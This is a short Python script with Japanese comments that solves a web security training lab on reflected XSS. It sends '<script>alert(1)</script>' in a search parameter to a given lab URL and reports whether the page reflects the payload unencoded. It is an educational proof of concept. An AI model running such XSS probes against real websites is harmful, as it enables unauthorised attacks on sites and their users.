#!/usr/bin/env python3

# Lab: Reflected XSS into HTML context with nothing encoded
# 手順:
# 1. 検索パラメータに XSS ペイロードを送る。
# 2. HTML 応答にペイロードがそのまま反射されたか確認する。
# 実行: python3 reflected_xss_into_html_context_with_nothing_encoded.py https://LAB-URL/

import sys

import requests


if len(sys.argv) != 2:
    raise SystemExit(f"使い方: python3 {sys.argv[0]} https://LAB-URL/")

lab_url = sys.argv[1]
payload = "<script>alert(1)</script>"

try:
    response = requests.get(lab_url, params={"search": payload}, timeout=10)
    response.raise_for_status()
except requests.RequestException as exc:
    raise SystemExit(f"[-] HTTP リクエスト失敗: {exc}") from exc

print(f"送信先: {response.url}")

position = response.text.find(payload)
if position == -1:
    raise SystemExit("[-] HTML 応答にペイロードがそのまま見つかりません")

start = max(0, position - 80)
end = position + len(payload) + 80
print(f"反射箇所: {response.text[start:end]}")
print("[+] HTML 応答への無変換の反射を確認しました")
